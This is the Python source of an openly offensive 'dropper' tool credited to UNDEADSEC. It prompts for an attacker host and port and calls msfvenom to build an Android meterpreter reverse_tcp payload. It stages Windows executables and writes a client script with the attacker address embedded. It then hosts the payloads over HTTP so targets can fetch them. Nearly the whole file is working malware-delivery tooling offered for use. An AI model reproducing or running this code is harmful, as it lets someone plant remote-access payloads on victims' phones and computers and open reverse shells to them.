from subprocess import call
from time import sleep
from os import geteuid
from sys import exit

if geteuid() != 0:
    exit('Enigma must be run as root')

RED, WHITE, YELLOW, CIANO, GREEN, END = '\033[91m', '\33[46m', '\33[93m', '\33[36m', '\033[1;32m', '\033[0m'

def message():
    call('clear', shell=True)
    print(f'''
{CIANO}:::::::::: ::::    ::: ::::::::::: ::::::::  ::::    ::::      :::     
:+:        :+:+:   :+:     :+:    :+:    :+: +:+:+: :+:+:+   :+: :+:   
+:+        :+:+:+  +:+     +:+    +:+        +:+ +:+:+ +:+  +:+   +:+  
+#++:++#   +#+ +:+ +#+     +#+    :#:        +#+  +:+  +#+ +#++:++#++: {END}
+#+        +#+  +#+#+#     +#+    +#+   +#+# +#+       +#+ +#+     +#+ 
#+#        #+#   #+#+#     #+#    #+#    #+# #+#       #+# #+#     #+# 
########## ###    #### ########### ########  ###       ### ###     ### 
                           {CIANO}DROPPER
                     by: UNDEADSEC from Brazil{END}''')

def runServer():
    print(f'\n {CIANO}[{END}*{CIANO}]{END} Starting Server... {GREEN}H4ppy h4ck1ng {END}:)')
    sleep(3)
    call('cd Server && python3 -m http.server 80', shell=True)

def generatePayloads():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*', shell=True)
    payloadLHOST = input(f'\n {CIANO}[{END}~{CIANO}]{END} Insert your payload LHOST: ')
    payloadLPORT = input(f'\n {CIANO}[{END}~{CIANO}]{END} Insert your payload LPORT: ')
    print(f'\n {CIANO}[{END}~{CIANO}]{END} Generating Payloads...')
    call(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={payloadLHOST} LPORT={payloadLPORT} -o Server/android_payload.apk', shell=True)

def generateClient():
    lhost = input(f'\n {CIANO}[{END}~{CIANO}]{END} Insert your LHOST: ')
    with open('Clients/sister.py', 'r') as template:
        content = template.read()
    with open('Output/sister.py', 'w') as new:
        new.write(f'#!/usr/bin/python3\n# -*- coding: utf-8 -*-\nhost = \"{lhost}\"\n')
        new.write(content)
    print(f'\n {CIANO}[{END}~{CIANO}]{END} Generating Clients...')
    sleep(3)
    print(f'\n {CIANO}[{END}*{CIANO}]{END} Process done.\n\n {GREEN}[{END}*{GREEN}] Clients saved to Output/{END}')

def init():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*', shell=True)
    print(f'\n {CIANO}[{END}~{CIANO}]{END} Arranging the house...')
    sleep(3)
    call(f'cp {win64} Server/x64/win.exe', shell=True)
    call(f'cp {win86} Server/x86/win.exe', shell=True)
    call(f'cp {android} Server/android_payload.apk', shell=True)
    print(f'\n {CIANO}[{END}*{CIANO}]{END} Process done.')

def main():
    global win64, win86, android
    print(f' Select an option:\n\n {CIANO}[{END}1{CIANO}]{END} Insert your custom payloads  -> Recommended\n\n {CIANO}[{END}2{CIANO}]{END} Generate payloads with metasploit')
    ask = input(f'\n{CIANO} EN1GM4 {END}> ')
    if ask == '1':
        win64 = input(f'\n {CIANO}[{END}1{CIANO}/{END}3{CIANO}]{END} Insert Windows Payload x64 file path: ')
        win86 = input(f'\n {CIANO}[{END}2{CIANO}/{END}3{CIANO}]{END} Insert Windows Payload x86 file path: ')
        android = input(f'\n {CIANO}[{END}3{CIANO}/{END}3{CIANO}]{END} Insert Android Payload file path: ')
        init()
    elif ask == '2':
        generatePayloads()
    generateClient()
    runServer()

message()
main()
